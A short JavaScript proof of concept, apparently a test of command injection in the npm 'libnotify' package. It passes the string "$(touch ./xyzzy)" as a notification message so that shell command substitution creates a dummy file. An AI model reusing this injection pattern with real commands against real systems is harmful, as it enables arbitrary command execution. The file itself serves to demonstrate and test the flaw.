done = function done(){
    console.log("Done!");
};

var DUMMY_FILE = './xyzzy';

var payload = "$(touch " + DUMMY_FILE + ")";

function dummySource(val){
    payload += val;
}

dummySource(' ');

var libnotify = require("libnotify");

libnotify.notify(payload, {title: ""}, done);


